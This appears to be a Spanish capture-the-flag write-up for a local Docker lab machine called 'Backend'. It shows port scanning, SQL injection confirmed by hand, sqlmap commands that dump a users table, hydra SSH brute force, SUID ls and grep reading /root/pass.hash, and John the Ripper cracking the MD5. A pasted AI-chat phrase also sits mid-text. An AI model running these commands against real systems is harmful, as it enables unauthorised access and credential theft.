# **Máquina: Backend**

### **Dificultad:** Fácil

### 📝 **Descripción:**


### 🎯 **Objetivo:**


![Logo](Imágenes/2025-05-17_19-35.png)

---

## 🖥️ **Despliegue de la máquina**

Descargamos el archivo `backend.zip`, lo descomprimimos y desplegamos la máquina usando el script `auto_deploy.sh` proporcionado. Esto inicia la máquina vulnerable dentro de un contenedor Docker:

```bash
unzip backend.zip
sudo bash auto_deploy.sh backend.tar
```

![Despliegue](Imágenes/Capturas.png)

---

## 📡 **Comprobación de conectividad**

Verificamos la conexión con un simple `ping` a la IP asignada (172.17.0.3):

```bash
ping -c1 172.17.0.3
```

![Ping](Imágenes/Capturas_1.png)

---

## 🔍 **Escaneo de puertos**

Ejecutamos un escaneo de puertos completo con `nmap`:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.3 -oG allPorts.txt
```

Puertos descubiertos:

* **22/tcp** – SSH
* **80/tcp** – HTTP

![Puertos](Imágenes/Capturas_2.png)

Posteriormente, realizamos un escaneo más detallado sobre los puertos encontrados:

```bash
nmap -sCV -p22,8009,8080 172.17.0.3 -oN target.txt
```

![Servicios](Imágenes/Capturas_3.png)

---

Entre http://172.17.0.3/ en donde se encuntra alojado una pagina web donde se ecnotro que existe un login.html 
![Pagina](Imágenes/Capturas_4.png)

---

![login](Imágenes/Capturas_5.png)

Comprobación de inyección SQL en el formulario de login

Durante la fase de pruebas, se introdujo el carácter ' al final del campo de nombre de usuario en el formulario de inicio de sesión, lo cual provocó un error,Este mensaje de error revela que el sistema construye la consulta SQL de manera insegura, concatenando directamente el valor proporcionado por el usuario. La aparición del error de sintaxis confirma que no se están utilizando sentencias preparadas ni un adecuado filtrado de entrada, lo cual indica una vulnerabilidad a inyección SQL.
![inyeccion](Imágenes/Capturas_6.png)

---

![error](Imágenes/Capturas_7.png)

Ejecuto  sqlmap -u "http://172.17.0.3/login.html" --forms --batch --dbs contra la URL `http://172.17.0.3/login.html`, analizando formularios web para detectar vulnerabilidades de inyección SQL y, si es vulnerable pero ya confirmamos que tiene esta vulnerabilidad, asi que enumerara las bases de datos automáticamente sin intervención del usuario.
Encontro:
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] users
![error](Imágenes/Capturas_8.png)

Usamos sqlmap -u "http://172.17.0.3/login.html" --forms --batch -D users --tables este comando usa sqlmap para analizar formularios en la página de login, buscar vulnerabilidades de inyección SQL y, si encuentra acceso, listar todas las tablas de la base de datos users automáticamente.
![usuarios](Imágenes/Capturas_9.png)

Ahora se usa sqlmap -u "http://172.17.0.3/login.html" --forms --batch -D users -T usuarios --dump Este comando de sqlmap analiza el formulario web vulnerable, accede a la base de datos users, selecciona la tabla usuarios y extrae automáticamente todos sus registros sin necesidad de intervención del usuario.
Se encontro:
+----+---------------+----------+
| id | password      | username |
+----+---------------+----------+
| 1  | $paco$123     | paco     |
| 2  | P123pepe3456P | pepe     |
| 3  | jjuuaann123   | juan     |
+----+---------------+----------+
![usuarios](Imágenes/Capturas_10.png)

Se puede probar estas credenciales manualmente pero yo use hydra cree dos .txt uno de usuarios y otro de contraseña y ejecute hydra -L usuarios.txt -P contraseña.txt ssh://172.17.0.3 -t 4 donde encontre las credenciañes de:
[22][ssh] host: 172.17.0.3   login: pepe   password: P123pepe3456P
![usuarios](Imágenes/Capturas_11.png)

Claro, aquí tienes una redacción clara y completa del **proceso que seguiste**, paso a paso, ideal para un informe técnico de pentesting:

---

## 🔍 Acceso por SSH y recolección de información

### 1. **Acceso inicial al sistema**

Se logró acceder exitosamente al sistema remoto mediante SSH utilizando las siguientes credenciales obtenidas previamente:

```bash
ssh pepe@172.17.0.3
```

Durante la conexión se aceptó la huella digital del servidor y se ingresó la contraseña correspondiente al usuario `pepe`.

---

### 2. **Verificación de privilegios**

Se intentó ejecutar el comando `sudo -l` para comprobar si el usuario `pepe` tenía permisos sudo, sin embargo, el sistema no tiene instalado `sudo`:

```bash
sudo -l
# Resultado:
# -bash: sudo: command not found
```

---

### 3. **Búsqueda de binarios con SUID**

Se utilizó `find` para localizar archivos con el bit SUID activado, que podrían permitir escalada de privilegios:

```bash
find / -perm -4000 2>/dev/null
```

Entre los resultados, destacan algunos binarios comunes con SUID:

* `/usr/bin/ls`
* `/usr/bin/grep`
* `/usr/bin/passwd`
* `/usr/bin/su`
* ...

---

### 4. **Acceso al directorio `/root`**

Gracias a que `/usr/bin/ls` tiene el bit SUID activo, se pudo listar el contenido del directorio `/root`, normalmente inaccesible para usuarios sin privilegios:

```bash
/usr/bin/ls -la /root
```

Esto permitió visualizar un archivo sospechoso:

```bash
/root/pass.hash
```

---

### 5. **Extracción del hash de contraseña**

Se utilizó el binario `grep` (también con SUID) para extraer el contenido del archivo:

```bash
/usr/bin/grep '' /root/pass.hash
# Resultado:
e43833c4c9d5ac444e16bb94715a75e4
```

Este valor corresponde a un **hash MD5**, posiblemente una contraseña de root o de un usuario privilegiado.
![contraseña](Imágenes/Capturas_13.png)

---

Guarde el hash MD5 en un archivo llamado hash, luego uso John the Ripper con el diccionario rockyou.txt y formato Raw-MD5 para descifrar la contraseña oculta: spongebob34

john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
![has](Imágenes/Capturas_12.png)

Entramos a ssh como pepe y entramos a su root con las credenciales encontradas con exito
![root](Imágenes/Capturas_14.png)
